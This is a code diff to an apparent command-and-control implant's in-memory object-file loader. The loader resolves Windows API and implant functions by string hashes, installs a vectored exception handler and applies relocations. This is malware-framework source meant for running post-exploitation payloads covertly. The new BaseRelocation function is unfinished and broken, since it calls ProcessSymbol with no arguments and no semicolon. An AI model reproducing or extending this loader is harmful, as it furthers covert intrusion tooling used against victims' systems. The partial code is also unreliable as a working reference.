@@ -3,7 +3,17 @@ namespace Objects {
 
     LPVOID WrapperReturn = nullptr;
 
-    _hash_map wrappers[] = {
+    _hash_map loader_wrappers[] = {
+        { .name = 0, .address = nullptr },
+        { .name = 0, .address = nullptr },
+        { .name = 0, .address = nullptr },
+        { .name = 0, .address = nullptr },
+        { .name = 0, .address = nullptr },
+        { .name = 0, .address = nullptr },
+        { .name = 0, .address = nullptr },
+    };
+
+    _hash_map implant_wrappers[] = {
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
@@ -36,45 +46,90 @@ namespace Objects {
         function((char*)args, size);
     }
 
-    BOOL ProcessSymbol(uint8_t* symbol_data, void** function) {
+    BOOL ProcessSymbol(char* sym_string, void** pointer) {
 
-        uint32_t type_hash  = 0;
-        uint32_t lib_hash   = 0;
-        uint32_t fn_hash    = 0;
+        bool success    = true;
+        bool import     = false;
 
-        bool success = true;
-        *function = nullptr;
+        char sym_name[1024] = { };
+        char *library       = { };
+        char *function      = { };
 
-        x_memcpy(&type_hash, symbol_data, sizeof(uint32_t));
-        x_memcpy(&fn_hash, symbol_data + sizeof(uint32_t), sizeof(uint32_t));
+        *pointer = nullptr;
 
-        switch (type_hash){
-            case COFF_INCL_HASH: {
+        if (Utils::HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {
+            function = sym_string + COFF_PREP_BEACON_SIZE;
 
-                x_memcpy(&lib_hash, symbol_data + (sizeof(uint32_t) * 2), sizeof(uint32_t));
-                C_PTR_HASHES(*function, fn_hash, lib_hash);
+            for (auto i = 0;; i++) {
+                if (!implant_wrappers[i].name) {
+                    break;
+                }
+                if (Utils::HashStringA(function, x_strlen(function)) == implant_wrappers[i].name) {
+                    *pointer = implant_wrappers[i].address;
+                    success_(true);
+                }
             }
-            case COFF_HEXANE_HASH: {
+            success_(false);
+        }
+        else if (Utils::HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
+            auto length = x_strlen(sym_string);
 
-                for (auto i = 0;; i++) {
-                    if (!wrappers[i].name) {
+            for (auto i = COFF_PREP_SYMBOL_SIZE +1; i < length -1; i++) {
+                if (sym_string[i] == '$') {
+                    import = true;
+                }
+            }
+
+            if (import) {
+                int count   = 0;
+                auto split  = x_split(S_PTR(sym_string) + COFF_PREP_SYMBOL_SIZE, S_PTR('$'), &count);
+
+                library     = split[0];
+                function    = split[1];
+
+#if _M_IX86
+                for (auto i = 0; function[i]; i++) {
+                    if (function[i] == '@') {
+                        function[i] = 0;
                         break;
                     }
+                }
+#endif
+                auto lib_hash   = Utils::HashStringA(library, x_strlen(library));
+                auto fn_hash    = Utils::HashStringA(function, x_strlen(function));
 
-                    if (fn_hash == wrappers[i].name) {
-                        *function = wrappers[i].address;
+                for (auto i = 0; i < count; i++) {
+                    x_free(split[i]);
+                }
+
+                x_assertb(C_PTR_HASHES(*pointer, lib_hash, fn_hash));
+            }
+            else {
+                function = sym_string + COFF_PREP_SYMBOL_SIZE;
+#if _M_IX86
+                for (auto i = 0; function[i]; i++) {
+                    if (function[i] == '@') {
+                        function[i] = 0;
+                        break;
+                    }
+                }
+#endif
+                for (auto i = 0;; i++) {
+                    if (!loader_wrappers[i].name) {
+                        break;
+                    }
+                    if (Utils::HashStringA(function, x_strlen(function)) == loader_wrappers[i].name) {
+                        *pointer = loader_wrappers[i].address;
                         success_(true);
                     }
                 }
-            }
-            case COFF_CONTEXT_HASH: {
 
-                *function = Ctx;
-                success_(true);
-            }
-            default: {
                 success_(false);
             }
+        }
+        else if (Utils::HashStringA(sym_string, x_strlen(sym_string)) == COFF_INSTANCE) {
+            *pointer = R_CAST(_hexane*, GLOBAL_OFFSET);
+            success_(true);
         }
 
         defer:
@@ -90,6 +145,7 @@ namespace Objects {
 
         uint32_t    protect     = 0;
         uint32_t    bit_mask    = 0;
+        uint32_t    name_hash   = 0;
         bool        success     = true;
 
         x_assertb(veh_handle = Ctx->nt.RtlAddVectoredExceptionHandler(1, &ExceptionHandler));
@@ -125,7 +181,6 @@ namespace Objects {
         }
 
         for (auto sym_index = 0; sym_index < object->nt_head->FileHeader.NumberOfSymbols; sym_index++) {
-
             if (object->symbol[sym_index].First.Value[0]) {
                 sym_name = object->symbol[sym_index].First.Name;
             }
@@ -133,7 +188,7 @@ namespace Objects {
                 sym_name = (char*)(object->symbol + object->nt_head->FileHeader.NumberOfSymbols) + object->symbol[sym_index].First.Value[1];
             }
 
-            const auto name_hash = Utils::GetHashFromStringA(sym_name, x_strlen(sym_name));
+            name_hash = Utils::GetHashFromStringA(sym_name, x_strlen(sym_name));
 
             if (x_memcmp(&name_hash, &function, sizeof(uint32_t)) == 0) {
                 entrypoint = object->sec_map[object->symbol[sym_index].SectionNumber - 1].address + object->symbol[sym_index].Value;
@@ -183,5 +238,45 @@ namespace Objects {
         }
 
         defer:
+    }
+
+    BOOL BaseRelocation(_executable *object) {
+        // todo: turns out the function names come from the binary, not a server message
+
+        _symbol *symbol     = { };
+        uint32_t type       = 0;
+        uint32_t fn_count   = 0;
+
+        char *name_ptr      = { };
+        char sym_name[9]    = { };
+
+        void *reloc_addr    = { };
+        void *fmap_addr     = { };
+        void *sec_addr      = { };
+
+        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
+            object->section = (IMAGE_SECTION_HEADER*) object->buffer + sizeof(IMAGE_FILE_HEADER) + (sizeof(IMAGE_SECTION_HEADER) * sec_index);
+            object->reloc   = (_reloc*) object->buffer + object->section->PointerToRelocations;
+
+            for (auto rel_index = 0; rel_index < object->section->NumberOfRelocations; rel_index++) {
+                symbol = &object->symbol[object->reloc->SymbolTableIndex];
+
+                if (symbol->First.Value[0]) {
+                    x_memset(sym_name, 0, 9);
+                    x_memcpy(sym_name, symbol->First.Name, 8);
+
+                    name_ptr = sym_name;
+                }
+                else {
+                    name_ptr = (char*)(object->symbol + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
+                }
+
+                reloc_addr  = object->sec_map[sec_index].address + object->reloc->VirtualAddress;
+                sec_addr    = object->sec_map[symbol->SectionNumber - 1].address;
+                fmap_addr   = object->fn_map + (fn_count * sizeof(void*));
+
+                x_assertb(ProcessSymbol())
+            }
+        }
     }
 }
